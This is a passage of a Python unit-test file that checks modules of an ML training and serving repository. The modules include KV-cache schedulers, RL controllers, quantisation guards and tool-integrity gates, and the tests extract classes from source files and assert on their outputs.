        proc = subprocess.run([sys.executable, "scripts/repo_doctor.py", "--trace", "GateFloor"], cwd=REPO_ROOT, capture_output=True, text=True, check=True)
        tr = json.loads(proc.stdout)
        self.assertGreaterEqual(tr["match_count"], 2)

    def test_201_v93_data_engineering_and_adr_compiler(self) -> None:
        import ast, importlib.util, math, sys
        from dataclasses import dataclass, field

        # 1. Live Host-Aware Crawling & Nemotron-CC-Math-v1 in prepare_seed_corpus.py
        psc_path = REPO_ROOT / "src" / "brain" / "prepare_seed_corpus.py"
        spec = importlib.util.spec_from_file_location("prepare_seed_corpus_v93", psc_path)
        mod = importlib.util.module_from_spec(spec)
        sys.modules["prepare_seed_corpus_v93"] = mod
        spec.loader.exec_module(mod)
        alloc = mod.score_and_prioritize_hosts({"high.org": [0.9, 0.95], "low.net": [0.1, 0.15]}, total_fetch_budget=100)
        self.assertEqual(sum(alloc.values()), 100)
        self.assertGreater(alloc["high.org"], alloc["low.net"] * 5)
        self.assertIn("nemotron_cc_math_v1", [s.name for s in mod.CORPUS_PROFILES["rtx3050_4gb_5gb"].sources])

        # 2. Live PT/MT x LR Co-Design in training_engine.py
        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        ttree = ast.parse(te_src)
        fn_nodes = [n for n in ttree.body if isinstance(n, ast.FunctionDef) and n.name == "compute_coupled_pt_mt_lr_schedule"]
        tns: dict = {"math": math}
        exec(compile(ast.Module(body=fn_nodes, type_ignores=[]), "<v93_te>", "exec"), tns)
        mt_early, lr_early = tns["compute_coupled_pt_mt_lr_schedule"](step=300, total_steps=1000, mt_start_frac=0.65, base_lr=3e-4, min_lr=3e-5)
        mt_late, lr_late = tns["compute_coupled_pt_mt_lr_schedule"](step=900, total_steps=1000, mt_start_frac=0.65, base_lr=3e-4, min_lr=3e-5)
        self.assertEqual(mt_early, 0.0)
        self.assertAlmostEqual(lr_early, 3e-4)
        self.assertGreater(mt_late, 0.5)
        self.assertLess(lr_late, 3e-4)

        # 3. Experimental FtF, Governed Ledger & MemShift
        trl_src = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        trl_ns: dict = {"dataclass": dataclass}
        exec(compile(ast.Module(body=[n for n in ast.parse(trl_src).body if isinstance(n, ast.ClassDef) and n.name == "FtFSAEFeatureDataSelector"], type_ignores=[]), "<v93_ftf>", "exec"), trl_ns)
        picked = trl_ns["FtFSAEFeatureDataSelector"](budget=2).select_indices([{"f1": 1.0}, {"f1": 0.9}, {"f2": 0.85}])
        self.assertEqual(set(picked), {0, 2})

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {"dataclass": dataclass, "field": field}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name in {"GovernedExperimentAppendOnlyLedger", "MemShiftDeterministicRepairRouter"}], type_ignores=[]), "<v93_hsp>", "exec"), hns)
        led = hns["GovernedExperimentAppendOnlyLedger"]()
        led.log_trial("t1", "h_bad", True, False)
        led.log_trial("t2", "h_bad", True, False)
        self.assertGreater(led.governance_metrics()["repeated_bad_rate"], 0.0)

        ms = hns["MemShiftDeterministicRepairRouter"]().plan_repair(["salary"], {"tax": ["salary"], "city": ["zip"]})
        self.assertEqual(ms["route_to_deterministic_program"], ["tax"])
        self.assertTrue(ms["block_freeform_llm_rederivation"])

        # 4. Strict Reserve Admission Policy in Constitution
        const = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        self.assertIn("第 24 条（`⚡扩展储备` 三项硬准入门槛", const)

    def test_202_v94_audit_table_and_plan_and_patch(self) -> None:
        import ast, subprocess, sys
        from dataclasses import dataclass

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {"dataclass": dataclass}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "PlanAndPatchLocalRepairPlanner"], type_ignores=[]), "<v94_pp>", "exec"), hns)
        res = hns["PlanAndPatchLocalRepairPlanner"]().patch_plan(["s0", "bad1", "bad2", "s3"], 1, 3, ["fix1"])
        self.assertEqual(res["patched_plan"], ["s0", "fix1", "s3"])
        self.assertEqual(res["preserved_prefix_len"], 1)
        self.assertEqual(res["preserved_suffix_len"], 1)

        proc = subprocess.run([sys.executable, "scripts/repo_doctor.py", "--audit-table"], cwd=REPO_ROOT, capture_output=True, text=True, check=True)
        self.assertIn("ADR-001", proc.stdout)
        self.assertIn("ADR-013", proc.stdout)

    def test_203_v95_replay_ssm_deltalog_and_transactional_kv_guard(self) -> None:
        import ast, pathlib
        from typing import Any, Dict, List, Optional
        from src.brain.config_profiles import get_profile

        # Verify profile flags
        p3 = get_profile("rtx3050_4gb_phase3_serving")
        self.assertTrue(p3.feature_flags.get("enable_replay_ssm_checkpoint"))
        self.assertTrue(p3.feature_flags.get("enable_transactional_kv_guard"))

        # Verify TransactionalKVStateGuard atomic physical rollback (arXiv:2608.15939v1)
        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {"Any": Any, "Dict": Dict, "List": List, "Optional": Optional}
        eb_nodes = [n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "TransactionalKVStateGuard"]
        exec(compile(ast.Module(body=eb_nodes, type_ignores=[]), "<v95_guard>", "exec"), eb_ns)

        class _MockReplaySSM:
            def __init__(self) -> None:
                self.step = 5
                self.rollbacks = 0
            def rollback_to_step(self, target: int) -> dict:
                if self.rollbacks >= 2:
                    return {"rolled_back": False, "reason": "anti_thrashing_circuit_breaker", "step": self.step}
                self.step = target
                self.rollbacks += 1
                return {"rolled_back": True, "reason": "o1_pointer_truncate", "step": self.step}

        guard = eb_ns["TransactionalKVStateGuard"]()
        ssm = _MockReplaySSM()
        kv_slots = ["k0", "k1", "k2"]
        ep0 = guard.begin_branch(ssm_step=2, kv_len=2)
        kv_slots.extend(["bad_k3", "bad_k4"])
        res = guard.abort_branch(ssm, kv_slots)
        self.assertTrue(res["aborted"])
        self.assertEqual(res["epoch"], ep0 + 1)
        self.assertEqual(kv_slots, ["k0", "k1"])
        self.assertEqual(ssm.step, 2)
        self.assertFalse(res["physical_residue_leaked"])

        # Verify ReplaySSMCheckpointBuffer symbol & anti-thrashing guard in sovereign_brain_pytorch.py
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("class ReplaySSMCheckpointBuffer", sb_src)
        self.assertIn("anti_thrashing_circuit_breaker", sb_src)
        self.assertIn("def materialize_state(", sb_src)
        self.assertIn("def rollback_to_step(", sb_src)


    def test_204_v96_kra_lt_tuning_and_eval_manifest(self) -> None:
        import ast, pathlib
        from src.brain.prepare_seed_corpus import get_eval_suite_manifest

        # 1. Verify final 5% eval & agentic RLVR manifest
        manifest = get_eval_suite_manifest()
        self.assertIn("code_execution", manifest)
        self.assertIn("HumanEval+", manifest["code_execution"]["benchmarks"])
        self.assertIn("RULER", manifest["long_context_niah"]["benchmarks"])

        # 2. Verify KernelRidgeAttentionChallenger recursive ridge + OU uncertainty recovery
        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        knodes = [n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "KernelRidgeAttentionChallenger"]
        exec(compile(ast.Module(body=knodes, type_ignores=[]), "<v96_kra>", "exec"), kns)
        kra = kns["KernelRidgeAttentionChallenger"](feature_dim=4, value_dim=4, ridge_lambda=1.0)
        out1 = kra.step([1.0, 0.0, 0.0, 0.0], [2.0, 0.0, 0.0, 0.0], [1.0, 0.0, 0.0, 0.0], delta=0.9)
        self.assertGreater(out1[0], 0.5)
        # Strong forgetting (delta -> 0.01) must restore covariance diagonal toward prior 1/lambda = 1.0
        _ = kra.step([0.0, 1.0, 0.0, 0.0], [0.0, 1.0, 0.0, 0.0], [0.0, 1.0, 0.0, 0.0], delta=0.01)
        self.assertGreater(kra.P[0][0], 0.95)

        # 3. Verify LTTuningConfidenceSwitch presence in live brain core
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("class LTTuningConfidenceSwitch", sb_src)
        self.assertIn("def create_lt_tuning_switch(", sb_src)


    def test_205_v97_loop_self_opt_and_four_hard_guards(self) -> None:
        import ast, json, subprocess, sys
        from typing import Any, Dict

        # 1. Verify Rule 25/26 in Constitution and --check-arxiv CLI pre-dedup gate
        const = (REPO_ROOT / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        self.assertIn("第 25 条", const)
        self.assertIn("第 26 条", const)
        proc = subprocess.run(
            [sys.executable, "scripts/repo_doctor.py", "--check-arxiv", "2611.23445", "9999.99999"],
            cwd=REPO_ROOT, capture_output=True, text=True, check=True,
        )
        res = json.loads(proc.stdout)
        self.assertIn("2611.23445", res["duplicates"])
        self.assertIn("9999.99999", res["brand_new"])

        # 2. Verify EarlyLayerW8QuantGuard & StopAndRedrawLoopBreaker
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        sb_nodes = [n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in {"EarlyLayerW8QuantGuard", "StopAndRedrawLoopBreaker"}]
        exec(compile(ast.Module(body=sb_nodes, type_ignores=[]), "<v97_sb>", "exec"), sb_ns)
        w8 = sb_ns["EarlyLayerW8QuantGuard"]()
        self.assertEqual(w8.select_bitwidth("prelude.0.weight", default_bits=4), 8)
        self.assertEqual(w8.select_bitwidth("core.3.weight", default_bits=4), 4)
        lb = sb_ns["StopAndRedrawLoopBreaker"](ngram_size=3, max_repeats=3)
        self.assertTrue(lb.should_redraw([1, 2, 3, 1, 2, 3, 1, 2, 3])["redraw"])
        self.assertFalse(lb.should_redraw([1, 2, 3, 4, 5, 6, 7, 8, 9])["redraw"])

        # 3. Verify GuidedRLVRLogicController
        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        te_nodes = [n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name == "GuidedRLVRLogicController"]
        exec(compile(ast.Module(body=te_nodes, type_ignores=[]), "<v97_te>", "exec"), te_ns)
        ctrl = te_ns["GuidedRLVRLogicController"](entropy_threshold=1.0, boost_strength=2.0)
        r_hi = ctrl.maybe_steer_logits([0.0, 0.0], step_entropy=1.5, is_boundary=True, steering_token_id=1)
        self.assertTrue(r_hi["steered"])
        self.assertEqual(r_hi["logits"][1], 2.0)

        # 4. Verify VerifierYoudenAuditGate
        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {"Any": Any, "Dict": Dict}
        eb_nodes = [n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "VerifierYoudenAuditGate"]
        exec(compile(ast.Module(body=eb_nodes, type_ignores=[]), "<v97_eb>", "exec"), eb_ns)
        vg = eb_ns["VerifierYoudenAuditGate"](min_youden=0.25)
        self.assertTrue(vg.audit(0.05, 0.10, evaluator_writable=False)["allow_rlvr_step"])
        self.assertFalse(vg.audit(0.05, 0.10, evaluator_writable=True)["allow_rlvr_step"])
        self.assertFalse(vg.audit(0.45, 0.40, evaluator_writable=False)["allow_rlvr_step"])


    def test_206_v98_tri_abstention_gpu_spec_and_rose_mask(self) -> None:
        import ast, pathlib
        from typing import Any, Dict

        # 1. Verify GPUAdaptiveSpecWidthController
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        sb_nodes = [n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name == "GPUAdaptiveSpecWidthController"]
        exec(compile(ast.Module(body=sb_nodes, type_ignores=[]), "<v98_gpu>", "exec"), sb_ns)
        ctl = sb_ns["GPUAdaptiveSpecWidthController"]()
        best = ctl.select_optimal_width({1: 1.0, 4: 3.1, 8: 4.5}, {1: 10.0, 4: 13.0, 8: 15.0})
        self.assertEqual(best["optimal_width"], 8)

        # 2. Verify ROSESubspaceRiskMask
        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        ws_nodes = [n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "ROSESubspaceRiskMask"]
        exec(compile(ast.Module(body=ws_nodes, type_ignores=[]), "<v98_rose>", "exec"), ws_ns)
        mask = ws_ns["ROSESubspaceRiskMask"](risk_threshold=0.7)
        proj = mask.project_safe_update([1.0, 1.0], [0.85, 0.2])
        self.assertEqual(proj[0], 0.0)
        self.assertAlmostEqual(proj[1], 0.8, places=6)

        # 3. Verify AbstentionDirectionTriRouter (Q / MK / HV + adaptive granularity)
        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {"Any": Any, "Dict": Dict}
        eb_nodes = [n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "AbstentionDirectionTriRouter"]
        exec(compile(ast.Module(body=eb_nodes, type_ignores=[]), "<v98_tri>", "exec"), eb_ns)
        tri = eb_ns["AbstentionDirectionTriRouter"]()
        self.assertEqual(tri.route(0.1, 0.1, 0.9)["action"], "refuse")
        self.assertEqual(tri.route(0.8, 0.1, 0.0)["action"], "clarify")
        self.assertEqual(tri.route(0.1, 0.8, 0.0)["action"], "lookup_engram_or_tool")
        self.assertEqual(tri.route(0.1, 0.1, 0.0, confidence=0.6)["granularity"], "coarse")
        self.assertEqual(tri.route(0.1, 0.1, 0.0, confidence=0.95)["granularity"], "exact")


    def test_207_v99_six_live_modules_and_19_breakthroughs(self) -> None:
        import ast, pathlib
        from typing import Any, Dict

        # 1. FOSCAR affine-folded low-bit KV equivalence & WG-KV pre-write admission
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        sb_nodes = [n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in {"FOSCARAffineFoldKVKernel", "WriteGatedKVAdmission"}]
        exec(compile(ast.Module(body=sb_nodes, type_ignores=[]), "<v99_sb>", "exec"), sb_ns)
        fk = sb_ns["FOSCARAffineFoldKVKernel"]()
        q, k_int, s, z = [1.5, -2.0, 0.5], [3, -1, 4], 0.25, 0.1
        exact = sum(qi * (s * ki + z) for qi, ki in zip(q, k_int))
        self.assertAlmostEqual(fk.affine_folded_dot(q, k_int, s, z), exact, places=6)
        wg = sb_ns["WriteGatedKVAdmission"](admission_threshold=0.6, local_window=2)
        adm = wg.admit([0.2, 0.8, 0.1, 0.9])
        self.assertEqual(adm["global_admitted"], [1, 3])
        self.assertEqual(adm["local_sliding"], [2])

        # 2. TurnWiseCreditAssigner
        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        te_nodes = [n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name == "TurnWiseCreditAssigner"]
        exec(compile(ast.Module(body=te_nodes, type_ignores=[]), "<v99_te>", "exec"), te_ns)
        advs = te_ns["TurnWiseCreditAssigner"]().compute_turn_advantages([1.0, 0.0], [0.5, 0.5])
        self.assertGreater(advs[0], 0.0)
        self.assertLess(advs[1], 0.0)

        # 3. ToolUpdateIntegrityGate
        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {"Any": Any, "Dict": Dict}
        eb_nodes = [n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "ToolUpdateIntegrityGate"]
        exec(compile(ast.Module(body=eb_nodes, type_ignores=[]), "<v99_eb>", "exec"), eb_ns)
        gate = eb_ns["ToolUpdateIntegrityGate"]()
        gate.register_tool("calc", "abc123")
        self.assertTrue(gate.verify_before_exec("calc", "abc123")["authorized"])
        self.assertFalse(gate.verify_before_exec("calc", "evil999")["authorized"])

        # 4. ProgramDistillationSystem0Compiler & OverlappingBlockDiffusionScheduler
        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "ProgramDistillationSystem0Compiler"], type_ignores=[]), "<v99_hsp>", "exec"), hns)
        sel = hns["ProgramDistillationSystem0Compiler"]().select_system0_policy([{"id": "p1", "dev_score": 0.7}, {"id": "p2", "dev_score": 0.92}])
        self.assertEqual(sel["selected_id"], "p2")

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "OverlappingBlockDiffusionScheduler"], type_ignores=[]), "<v99_ksp>", "exec"), kns)
        self.assertTrue(kns["OverlappingBlockDiffusionScheduler"]().should_spawn_next_block(0.75)["spawn_block_next"])


    def test_208_v10_0_eight_modules_and_27_breakthroughs(self) -> None:
        import ast, pathlib

        # 1. LoopSkim, ShallowWriteAnchor, CVSA in sovereign_brain_pytorch.py
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        sb_nodes = [n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in {"LoopSkimMultiDepthVerifier", "ShallowWriteAnchorExtractor", "CVSAZeroDenseCoverageGate"}]
        exec(compile(ast.Module(body=sb_nodes, type_ignores=[]), "<v10_sb>", "exec"), sb_ns)
        ls = sb_ns["LoopSkimMultiDepthVerifier"]().admit_drafts([10, 20, 30], [10, 20, 99])
        self.assertEqual(ls["admitted_prefix_len"], 2)
        self.assertTrue(ls["rejected_early"])
        self.assertEqual(sb_ns["ShallowWriteAnchorExtractor"](0.75).anchor_layer_index(12), 9)
        cv = sb_ns["CVSAZeroDenseCoverageGate"](0.90)
        self.assertEqual(cv.check_layer(0, 0.50)["mode"], "forced_dense_layer0")
        self.assertTrue(cv.check_layer(3, 0.70)["trigger_recovery"])

        # 2. SpectralUnlearningMuonUpdater in training_engine.py
        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name == "SpectralUnlearningMuonUpdater"], type_ignores=[]), "<v10_te>", "exec"), te_ns)
        step = te_ns["SpectralUnlearningMuonUpdater"]().spectral_normalized_step([[3.0, 4.0]], lr=0.5)
        self.assertAlmostEqual(step[0][0], -0.3, places=5)

        # 3. DISCERNReadTimeResolver in wake_sleep_runtime.py
        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "DISCERNReadTimeResolver"], type_ignores=[]), "<v10_ws>", "exec"), ws_ns)
        dr = ws_ns["DISCERNReadTimeResolver"]()
        self.assertFalse(dr.append_fact("x", "bad", 1, falsification_passed=False))
        self.assertTrue(dr.append_fact("x", "v1", 1, falsification_passed=True))
        self.assertTrue(dr.append_fact("x", "v2", 2, falsification_passed=True))
        res = dr.resolve_at_read("x")
        self.assertEqual(res["value"], "v2")
        self.assertEqual(res["history_preserved"], 2)

        # 4. ExecutableFSMProcedureGuard in exoskeleton_bridge.py
        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "ExecutableFSMProcedureGuard"], type_ignores=[]), "<v10_eb>", "exec"), eb_ns)
        fsm = eb_ns["ExecutableFSMProcedureGuard"]()
        self.assertFalse(fsm.can_edit_source())
        self.assertTrue(fsm.transition("ROOT_CAUSE_COMMITTED"))
        self.assertTrue(fsm.can_edit_source())

        # 5. CodeQuant2 & TTSP in src/experimental/
        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "CodeQuant2SharedMemLUTPlanner"], type_ignores=[]), "<v10_ksp>", "exec"), kns)
        self.assertTrue(kns["CodeQuant2SharedMemLUTPlanner"]().fits_shared_memory(256))

        trp_src = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        tns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(trp_src).body if isinstance(n, ast.ClassDef) and n.name == "TestTimeSelfPlayVerifierFreePlanner"], type_ignores=[]), "<v10_trp>", "exec"), tns)
        self.assertTrue(tns["TestTimeSelfPlayVerifierFreePlanner"]().should_activate_ttsp(0.3, 0.2)["activate_ttsp"])


    def test_209_v10_1_1000plus_milestone_live_fusion(self) -> None:
        """v10.1 1,000+ refs milestone: verify all 6 live brain modules + 2 experimental planners."""
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        wanted_sb = {"DecodeFeedbackKVEvictionTimer", "SynLatSyntaxAlignedCompressor"}
        exec(compile(ast.Module(body=[n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_sb], type_ignores=[]), "<v101_sb>", "exec"), sb_ns)
        kv = sb_ns["DecodeFeedbackKVEvictionTimer"](kl_budget=0.05)
        self.assertFalse(kv.decide_eviction(0, [0.01, 0.2])["evict_now"])
        ev = kv.decide_eviction(1, [0.01, 0.2])
        self.assertTrue(ev["evict_now"])
        self.assertEqual(ev["kept_indices"], [1])

        syn = sb_ns["SynLatSyntaxAlignedCompressor"](blend_alpha=0.5)
        self.assertEqual(syn.blend_embedding([1.0, 0.0], [0.0, 1.0]), [0.5, 0.5])
        self.assertTrue(syn.should_early_stop(["42", "42"], stable_window=2))

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        wanted_te = {"TACOOpeNormOneSparseUpdater", "InfoGRPODoubleRolloutEstimator"}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_te], type_ignores=[]), "<v101_te>", "exec"), te_ns)
        taco = te_ns["TACOOpeNormOneSparseUpdater"]().column_one_sparse_ternary([[0.1, -2.0], [0.9, 0.2]])
        self.assertEqual(taco, [[0, -1], [1, 0]])
        adv = te_ns["InfoGRPODoubleRolloutEstimator"]().estimate_multi_reward_advantage({"acc": [0.0, 1.0], "fmt": [1.0, 1.0]})
        self.assertGreater(adv["combined_advantage"], 0.0)

        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "UMASMultiAgentUncertaintyGate"], type_ignores=[]), "<v101_ws>", "exec"), ws_ns)
        uq = ws_ns["UMASMultiAgentUncertaintyGate"]().evaluate_consensus([0.9, 0.85], retrieval_depth=2, jacobian_margin=0.4)
        self.assertFalse(uq["abstain"])
        self.assertTrue(uq["perplexity_valid"])

        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "HostSecondaryToolAuthGuard"], type_ignores=[]), "<v101_eb>", "exec"), eb_ns)
        guard = eb_ns["HostSecondaryToolAuthGuard"]()
        self.assertFalse(guard.authorize_tool_call("save_logs", True, ("read_file",))["allowed"])
        self.assertFalse(guard.verify_kernel_cache_digest("abc", "def")["integrity_ok"])

        trp_src = (REPO_ROOT / "src" / "experimental" / "training_and_rl_planners.py").read_text(encoding="utf-8")
        tns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(trp_src).body if isinstance(n, ast.ClassDef) and n.name == "TRACERolloutGuidedFP4Planner"], type_ignores=[]), "<v101_trp>", "exec"), tns)
        self.assertEqual(tns["TRACERolloutGuidedFP4Planner"]().select_fp4_rounding_bias(0.5, 0.25)["mantissa_nudge"], 1)

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "SPARESparsityRoutingEntropyPlanner"], type_ignores=[]), "<v101_ksp>", "exec"), kns)
        sp = kns["SPARESparsityRoutingEntropyPlanner"]().allocate_layer_sparsity([0.2, 0.8], target_mean_sparsity=0.5)
        self.assertGreater(sp[0], sp[1])


    def test_210_v10_2_61_breakthroughs_live_fusion(self) -> None:
        """v10.2 61 zero-dup breakthroughs: verify all 6 live brain modules + 2 experimental planners."""
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        wanted_sb = {"SPARECompactRecurrentStateProjector", "VerKVFathomCertificateFetcher"}
        exec(compile(ast.Module(body=[n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_sb], type_ignores=[]), "<v102_sb>", "exec"), sb_ns)
        sp = sb_ns["SPARECompactRecurrentStateProjector"](energy_threshold=0.95)
        self.assertEqual(sp.select_effective_rank([10.0, 1.0, 0.1]), 1)
        self.assertEqual(sp.merge_loopfill_drafts([1, 2], [2, 3]), [1, 2, 3])
        vk = sb_ns["VerKVFathomCertificateFetcher"](eps_bound=0.05)
        self.assertTrue(vk.verify_before_fetch(0.02, [1.0, 3.0], bit_budget=8)["skip_cpu_fetch"])
        self.assertFalse(vk.validate_quant_pruning_combo("NF4", 0.30)["allowed"])
        self.assertTrue(vk.validate_quant_pruning_combo("INT8", 0.50)["allowed"])

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        wanted_te = {"MarginProximalEntropyRLVRController", "TVPDRealSpeculativeLossScheduler"}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_te], type_ignores=[]), "<v102_te>", "exec"), te_ns)
        mc = te_ns["MarginProximalEntropyRLVRController"]()
        self.assertTrue(mc.audit_truncation_budget_risk(0.25, 0.005)["budget_internalization_risk"])
        w = mc.compute_proximal_margin_weights([0.1, 0.9, 0.1])
        self.assertAlmostEqual(sum(w) / len(w), 1.0, places=4)
        tvp = te_ns["TVPDRealSpeculativeLossScheduler"]()
        self.assertAlmostEqual(tvp.expected_acceptance_length([0.8, 0.5]), 1.2, places=5)

        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "LMMRDeltaProceduralMemoryBridge"], type_ignores=[]), "<v102_ws>", "exec"), ws_ns)
        sel = ws_ns["LMMRDeltaProceduralMemoryBridge"]().select_within_budget([{"id": "a", "tokens": 250, "gain_per_token": 0.9}, {"id": "b", "tokens": 200, "gain_per_token": 0.5}], token_budget=400)
        self.assertEqual([x["id"] for x in sel], ["a"])

        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "MCPProviderBindingAndOverServeGuard"], type_ignores=[]), "<v102_eb>", "exec"), eb_ns)
        mg = eb_ns["MCPProviderBindingAndOverServeGuard"](max_status_polls=2)
        bindings = {"check_status": ("trusted_srv", "sha1")}
        self.assertFalse(mg.verify_provider_and_budget("evil_srv", "check_status", "sha1", bindings)["allowed"])
        self.assertTrue(mg.verify_provider_and_budget("trusted_srv", "check_status", "sha1", bindings, is_status_poll=True)["allowed"])
        self.assertTrue(mg.verify_provider_and_budget("trusted_srv", "check_status", "sha1", bindings, is_status_poll=True)["allowed"])
        self.assertFalse(mg.verify_provider_and_budget("trusted_srv", "check_status", "sha1", bindings, is_status_poll=True)["allowed"])

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "TriadicGDNUpcyclePlanner"], type_ignores=[]), "<v102_ksp>", "exec"), kns)
        self.assertEqual(kns["TriadicGDNUpcyclePlanner"]().state_bytes(8, 64, 64, 8, 2), 524288)

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "LeCatVerbatimRepetitionAuditPlanner"], type_ignores=[]), "<v102_hsp>", "exec"), hns)
